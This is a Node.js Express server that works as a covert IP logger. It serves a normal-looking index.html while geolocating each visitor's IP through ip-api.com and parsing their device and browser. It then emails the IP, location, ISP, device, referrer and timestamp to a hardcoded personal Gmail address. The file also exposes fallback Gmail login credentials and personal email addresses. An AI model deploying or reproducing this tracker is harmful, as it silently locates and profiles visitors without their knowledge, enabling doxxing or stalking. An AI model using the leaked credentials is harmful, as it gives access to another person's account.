const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'staysane.rz@gmail.com',
    pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr'
  }
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referrer = req.headers['referer'] || 'direct';
  const timestamp = new Date().toISOString();

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const deviceInfo = `${device.model || 'Unknown device'} (${os.name} ${os.version}), ${browser.name} ${browser.version}`;

  let location = 'Unknown location';
  try {
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName, country, isp } = geo.data;
    location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
  } catch (err) {
    console.error('Failed to get location:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!\n
            Timestamp: ${timestamp}\n
            IP Address: ${ip}\n
            Location: ${location}\n
            Device: ${deviceInfo}\n
            User Agent: ${userAgent}\n
            Referrer: ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
